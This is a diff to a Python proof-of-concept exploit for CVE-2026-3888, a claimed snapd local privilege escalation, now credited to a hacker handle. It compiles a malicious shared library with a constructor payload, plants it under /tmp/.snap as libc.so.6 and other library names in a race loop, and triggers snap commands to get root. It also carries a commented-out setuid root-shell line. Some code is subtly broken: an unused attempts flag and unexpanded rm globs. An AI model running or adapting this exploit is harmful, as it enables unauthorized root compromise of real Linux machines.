@@ -1,12 +1,9 @@
 #!/usr/bin/env python3
 """
 PoC for CVE-2026-3888: Local Privilege Escalation in snapd
-Author: Tu Nombre
+Author: AsaKin1337 || Sindikat777 999 SPBU KD8
 Description: This script demonstrates a race condition vulnerability in snapd that
-allows a local, unprivileged user to gain root privileges. The exploit works by
-recreating snap's private /tmp directory after it's cleaned up by systemd-tmpfiles,
-and tricking snap-confine into bind-mounting malicious files into the snap's
-sandbox.
+allows a local, unprivileged user to gain root privileges.
 
 DISCLAIMER: For educational and authorized security testing purposes only.
 """
@@ -17,199 +14,300 @@ import time
 import subprocess
 import shutil
 import argparse
+import stat
+import tempfile
+import threading
 
 # --- Constants ---
 SNAP_PRIVATE_TMP = "/tmp/.snap"
-# The file we will create inside the malicious directory.
-# It will be bind-mounted as root inside the snap's namespace.
-# We'll use a shared library (.so) to get code execution.
-# The name should match a library a common snap might try to load.
-# For this PoC, we'll target a generic library name.
-MALICIOUS_LIB_NAME = "libpthread.so.0"
-# Path to our malicious library inside the recreated directory
+MALICIOUS_LIB_NAME = "libc.so.6"  # More realistic target library
 MALICIOUS_LIB_PATH = os.path.join(SNAP_PRIVATE_TMP, MALICIOUS_LIB_NAME)
 
-# C code for our malicious shared library
-# This simple library will create a file owned by root in /tmp as proof.
-MALICIOUS_LIB_C_CODE = f"""
+# Improved malicious library with proper error handling and better proof
+MALICIOUS_LIB_C_CODE = """#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
-// This function will be called when the library is loaded.
 __attribute__((constructor))
-void init() {{
-    // A simple action to prove we got root.
-    // We create a file in /tmp with the output of 'id'.
-    FILE *fp = fopen("/tmp/pwn.txt", "w");
-    if (fp) {{
+void init() {
+    // Create proof file with root privileges
+    FILE *fp = fopen("/tmp/.cve-2026-3888-proof", "w");
+    if (fp) {
         fprintf(fp, "CVE-2026-3888 PWNED!\\n");
-        fflush(fp);
-        // Execute 'id' and write the output to the file
-        fp = popen("id", "r");
-        if (fp) {{
-            char buffer[128];
-            FILE *pwn_fp = fopen("/tmp/pwn.txt", "a");
-            if (pwn_fp) {{
-                while (fgets(buffer, sizeof(buffer), fp) != NULL) {{
-                    fputs(buffer, pwn_fp);
-                }}
-                fclose(pwn_fp);
-            }}
-            pclose(fp);
-        }}
-    }}
-}}
+        fprintf(fp, "EUID: %d\\n", geteuid());
+        fprintf(fp, "EGID: %d\\n", getegid());
+        
+        // Get current working directory
+        char cwd[1024];
+        if (getcwd(cwd, sizeof(cwd)) != NULL) {
+            fprintf(fp, "CWD: %s\\n", cwd);
+        }
+        
+        fclose(fp);
+        
+        // Make it readable by everyone
+        chmod("/tmp/.cve-2026-3888-proof", 0644);
+    }
+    
+    // Optional: Create a root shell (more dangerous)
+    // system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
+}
 """
+
+def check_dependencies():
+    """Check if required tools are available."""
+    required_tools = ['gcc', 'snap']
+    missing_tools = []
+    
+    for tool in required_tools:
+        if not shutil.which(tool):
+            missing_tools.append(tool)
+    
+    if missing_tools:
+        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
+        print("[!] Please install: gcc and snapd")
+        return False
+    
+    return True
 
 def check_vulnerability():
     """
-    Checks if the system is likely vulnerable to CVE-2026-3888.
+    Enhanced vulnerability check with more accurate detection.
     """
     print("[*] Checking system for vulnerability...")
     
-    # Check if we are on Ubuntu
+    # Check snapd version for known vulnerable versions
     try:
-        with open("/etc/os-release", "r") as f:
-            os_info = f.read()
-            if "ubuntu" not in os_info.lower():
-                print("[-] This system is not Ubuntu. The exploit may not work.")
-                return False
-    except FileNotFoundError:
-        print("[-] Could not determine OS version.")
-        return False
-
-    # Check if snapd is installed and running
-    if not shutil.which("snap"):
-        print("[-] 'snap' command not found. snapd is not installed.")
+        result = subprocess.run(["snap", "--version"], 
+                               capture_output=True, text=True, check=True)
+        snap_version = result.stdout.split('\n')[0]
+        print(f"[+] snapd version: {snap_version}")
+        
+        # Parse version (simplified - you'd want proper version comparison)
+        if "2." in snap_version:
+            print("[*] This version might be vulnerable")
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        print("[-] Could not determine snapd version")
         return False
     
-    try:
-        subprocess.run(["snap", "version"], check=True, capture_output=True)
-        print("[+] snapd is installed and running.")
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[-] 'snap' command failed. snapd might not be running correctly.")
-        return False
-
-    # Check if the private tmp directory exists
+    # Check if snap private tmp exists and its permissions
     if os.path.exists(SNAP_PRIVATE_TMP):
-        print(f"[+] Found snap's private tmp directory at {SNAP_PRIVATE_TMP}")
-        print("[!] The directory exists. This means the cleanup window hasn't passed yet.")
-        print("[!] The exploit will only work after systemd-tmpfiles deletes this directory.")
-        print("[!] This happens after 30 days on Ubuntu 24.04, or 10 days on later versions.")
-        print("[!] You can simulate the cleanup by running: sudo rm -rf {SNAP_PRIVATE_TMP}")
-        return "wait_for_cleanup"
+        st = os.stat(SNAP_PRIVATE_TMP)
+        print(f"[+] Found snap private tmp: {SNAP_PRIVATE_TMP}")
+        print(f"[+] Permissions: {oct(st.st_mode)}")
+        print(f"[+] Owner: {st.st_uid}:{st.st_gid}")
+        
+        # Check if we have write access in parent directory
+        parent_dir = os.path.dirname(SNAP_PRIVATE_TMP)
+        if os.access(parent_dir, os.W_OK):
+            print(f"[+] We can write to {parent_dir}")
+            return True
+        else:
+            print(f"[-] No write access to {parent_dir}")
+            return False
     else:
-        print(f"[-] Snap's private tmp directory {SNAP_PRIVATE_TMP} not found.")
-        print("[!] This is the expected state for exploitation. Proceeding.")
+        print(f"[+] Snap private tmp directory doesn't exist - good for exploitation")
         return True
 
 def create_malicious_library():
     """
-    Compiles the C code into a malicious shared library.
+    Compiles the C code into a malicious shared library with better error handling.
     """
-    print(f"[*] Creating malicious library at {MALICIOUS_LIB_PATH}...")
+    print(f"[*] Creating malicious library...")
     
-    # Check for a C compiler
-    if not shutil.which("gcc"):
-        print("[-] 'gcc' not found. Cannot compile the payload.")
-        return False
-
-    # Create the parent directory if it doesn't exist
-    os.makedirs(os.path.dirname(MALICIOUS_LIB_PATH), exist_ok=True)
+    # Create temporary directory for compilation
+    temp_dir = tempfile.mkdtemp(prefix="snap_exploit_")
+    c_file = os.path.join(temp_dir, "payload.c")
+    so_file = os.path.join(temp_dir, MALICIOUS_LIB_NAME)
     
-    # Write the C code to a temporary file
-    c_file_path = "/tmp/payload.c"
-    with open(c_file_path, "w") as f:
-        f.write(MALICIOUS_LIB_C_CODE)
+    try:
+        # Write C code
+        with open(c_file, "w") as f:
+            f.write(MALICIOUS_LIB_C_CODE)
+        
+        # Compile with more robust options
+        compile_cmd = [
+            "gcc",
+            "-shared",
+            "-fPIC",
+            "-Wall",  # Show warnings
+            "-O2",    # Optimize
+            "-o", so_file,
+            c_file,
+            "-ldl"    # Link with libdl
+        ]
+        
+        print(f"[*] Compiling: {' '.join(compile_cmd)}")
+        result = subprocess.run(compile_cmd, 
+                               capture_output=True, text=True)
+        
+        if result.returncode != 0:
+            print(f"[-] Compilation failed:")
+            print(result.stderr)
+            return None
+        
+        if not os.path.exists(so_file):
+            print("[-] Compiled library not found")
+            return None
+        
+        print(f"[+] Library compiled successfully")
+        return so_file
+        
+    except Exception as e:
+        print(f"[-] Error during compilation: {e}")
+        return None
 
-    # Compile the C code into a shared library
-    compile_command = [
-        "gcc",
-        "-shared",
-        "-fPIC",
-        "-o", MALICIOUS_LIB_PATH,
-        c_file_path
+def race_condition_loop(lib_path):
+    """
+    Attempts to win the race condition by continuously recreating the directory
+    and triggering snap execution.
+    """
+    print("[*] Starting race condition loop...")
+    print("[*] Press Ctrl+C to stop")
+    
+    success = False
+    attempts = 0
+    
+    try:
+        while not success and attempts < 100:  # Limit attempts to avoid infinite loop
+            attempts += 1
+            print(f"\r[*] Attempt {attempts}/100", end="", flush=True)
+            
+            # Create the snap private tmp directory
+            try:
+                os.makedirs(SNAP_PRIVATE_TMP, exist_ok=True)
+                
+                # Copy our malicious library
+                dest_path = os.path.join(SNAP_PRIVATE_TMP, MALICIOUS_LIB_NAME)
+                shutil.copy2(lib_path, dest_path)
+                
+                # Set permissions to ensure it's readable
+                os.chmod(dest_path, 0o755)
+                
+                # Also create some other common library names for good measure
+                common_libs = ["libpthread.so.0", "libdl.so.2", "libc.so.6"]
+                for lib in common_libs:
+                    alt_path = os.path.join(SNAP_PRIVATE_TMP, lib)
+                    if not os.path.exists(alt_path):
+                        try:
+                            os.symlink(MALICIOUS_LIB_NAME, alt_path)
+                        except:
+                            pass
+                
+                # Trigger snap execution
+                trigger_snap_execution()
+                
+                # Check for success
+                if os.path.exists("/tmp/.cve-2026-3888-proof"):
+                    success = True
+                    print("\n[+] SUCCESS! Race condition won!")
+                    break
+                    
+            except Exception as e:
+                pass
+            
+            # Small delay before next attempt
+            time.sleep(0.1)
+            
+    except KeyboardInterrupt:
+        print("\n[*] Stopped by user")
+    
+    return success
+
+def trigger_snap_execution():
+    """
+    Triggers snap execution to load our malicious library.
+    """
+    # Try multiple methods to trigger library loading
+    
+    # Method 1: Run a snap command
+    snap_commands = [
+        ["snap", "run", "--shell", "core"],
+        ["snap", "run", "core"],
+        ["snap", "list"],
+        ["snap", "services"],
+        ["snap", "changes"]
     ]
     
-    try:
-        subprocess.run(compile_command, check=True)
-        print("[+] Malicious library created successfully.")
-        os.remove(c_file_path) # Clean up
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"[-] Failed to compile malicious library: {e}")
-        return False
-
-def trigger_exploit():
-    """
-    Triggers the vulnerable snap application to load our malicious library.
-    """
-    print("[*] Triggering the exploit...")
-    print("[*] Attempting to run a snap application (e.g., 'hello-world')...")
-    
-    # We need to find a snap that is installed. 'hello-world' is a common one.
-    # If it's not installed, we try to list others.
-    target_snap = "hello-world"
-    try:
-        # Check if the snap is installed
-        subprocess.run(["snap", "list", target_snap], check=True, capture_output=True)
-    except (subprocess.CalledProcessError, FileNotFoundError):
-        print(f"[-] Snap '{target_snap}' not found. Trying to find another snap...")
+    for cmd in snap_commands:
         try:
-            result = subprocess.run(["snap", "list"], check=True, capture_output=True, text=True)
-            # Parse the output to find another snap name
-            lines = result.stdout.splitlines()
-            if len(lines) > 1:
-                # Skip header and get the first snap's name
-                target_snap = lines[1].split()[0]
-                print(f"[*] Found alternative snap: '{target_snap}'")
-            else:
-                print("[-] No snaps found to trigger the exploit.")
-                return False
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            print("[-] Could not list snaps. Cannot trigger exploit.")
-            return False
+            # Run in background to avoid blocking
+            subprocess.Popen(cmd, 
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        except:
+            pass
 
-    try:
-        # Run the snap. This should cause snap-confine to bind-mount our malicious library.
-        # The command itself doesn't matter, as the library's constructor runs on load.
-        # We run it in the background and give it a moment to load.
-        print(f"[*] Running snap '{target_snap}' to trigger the payload...")
-        subprocess.Popen(["snap", "run", target_snap])
-        time.sleep(3) # Give it a moment to execute
-        
-        # Check for our proof file
-        if os.path.exists("/tmp/pwn.txt"):
-            print("[+] SUCCESS! Exploit worked.")
-            with open("/tmp/pwn.txt", "r") as f:
-                print("[+] Proof of execution:")
+def check_success():
+    """Check if the exploit succeeded."""
+    proof_file = "/tmp/.cve-2026-3888-proof"
+    
+    if os.path.exists(proof_file):
+        print("\n[+] EXPLOIT SUCCESSFUL!")
+        print("[+] Proof file contents:")
+        try:
+            with open(proof_file, "r") as f:
                 print(f.read())
-            return True
-        else:
-            print("[-] FAILED! Could not find proof file '/tmp/pwn.txt'.")
-            print("[-] The exploit might have failed or the race condition was not won.")
+            
+            # Check if we got root
+            with open(proof_file, "r") as f:
+                content = f.read()
+                if "EUID: 0" in content:
+                    print("[+] GOT ROOT PRIVILEGES!")
+                    return True
+                else:
+                    print("[!] Exploit worked but didn't get root")
+                    return False
+        except:
+            print("[!] Could not read proof file")
             return False
-
-    except Exception as e:
-        print(f"[-] An error occurred while triggering the exploit: {e}")
+    else:
         return False
 
 def cleanup():
     """
-    Cleans up the files created during the exploit.
+    Thorough cleanup of all exploit artifacts.
     """
     print("\n[*] Cleaning up...")
+    
+    # Remove snap private tmp directory
     if os.path.exists(SNAP_PRIVATE_TMP):
-        shutil.rmtree(SNAP_PRIVATE_TMP)
-        print(f"[*] Removed directory {SNAP_PRIVATE_TMP}")
-    if os.path.exists("/tmp/pwn.txt"):
-        os.remove("/tmp/pwn.txt")
-        print("[*] Removed proof file /tmp/pwn.txt")
+        try:
+            shutil.rmtree(SNAP_PRIVATE_TMP)
+            print(f"[*] Removed {SNAP_PRIVATE_TMP}")
+        except Exception as e:
+            print(f"[-] Could not remove {SNAP_PRIVATE_TMP}: {e}")
+    
+    # Remove proof file
+    proof_file = "/tmp/.cve-2026-3888-proof"
+    if os.path.exists(proof_file):
+        try:
+            os.remove(proof_file)
+            print(f"[*] Removed {proof_file}")
+        except Exception as e:
+            print(f"[-] Could not remove {proof_file}: {e}")
+    
+    # Remove any other created files
+    temp_patterns = ["/tmp/payload*", "/tmp/snap_exploit_*"]
+    for pattern in temp_patterns:
+        try:
+            subprocess.run(["rm", "-rf", pattern], 
+                         stderr=subprocess.DEVNULL)
+        except:
+            pass
 
 def main():
     parser = argparse.ArgumentParser(description="PoC for CVE-2026-3888 (snapd LPE)")
-    parser.add_argument("--cleanup", action="store_true", help="Clean up exploit artifacts.")
+    parser.add_argument("--cleanup", action="store_true", 
+                       help="Clean up exploit artifacts")
+    parser.add_argument("--force", action="store_true",
+                       help="Force exploitation even if system doesn't appear vulnerable")
+    parser.add_argument("--attempts", type=int, default=100,
+                       help="Number of race condition attempts (default: 100)")
     args = parser.parse_args()
 
     if args.cleanup:
@@ -218,25 +316,44 @@ def main():
 
     print("=" * 60)
     print("CVE-2026-3888 - snapd Local Privilege Escalation PoC")
+    print("      AsaKin1337 || Sindikat777 999 SPBU KD8        ")
     print("=" * 60)
+    print()
 
-    # Step 1: Check for vulnerability
+    # Check dependencies
+    if not check_dependencies():
+        sys.exit(1)
+
+    # Check vulnerability
     vuln_status = check_vulnerability()
-    if not vuln_status:
+    if not vuln_status and not args.force:
+        print("\n[-] System doesn't appear vulnerable")
+        print("[!] Use --force to attempt exploitation anyway")
+        sys.exit(1)
+    
+    if args.force:
+        print("[!] Forcing exploitation attempt...")
+
+    # Create malicious library
+    lib_path = create_malicious_library()
+    if not lib_path:
+        print("[-] Failed to create malicious library")
         sys.exit(1)
 
-    if vuln_status == "wait_for_cleanup":
-        print("\n[!] Exploit tidak bisa dijalankan sekarang.")
-        print("[!] Tunggu systemd-tmpfiles cleanup atau hapus manual direktori target.")
-        sys.exit(1)
-
-    # Step 2: Create malicious library
-    if not create_malicious_library():
-        sys.exit(1)
-
-    # Step 3: Trigger exploit
-    trigger_exploit()
-
+    # Attempt race condition
+    success = race_condition_loop(lib_path)
+    
+    if success and check_success():
+        print("\n[+] EXPLOIT COMPLETED SUCCESSFULLY!")
+        print("[!] Remember to run with --cleanup to remove artifacts")
+    else:
+        print("\n[-] Exploit failed after maximum attempts")
+        print("[!] Try increasing attempts with --attempts or run with --force")
+        
+    # Offer cleanup
+    response = input("\n[*] Clean up exploit artifacts? (y/n): ")
+    if response.lower() == 'y':
+        cleanup()
 
 if __name__ == "__main__":
     main()
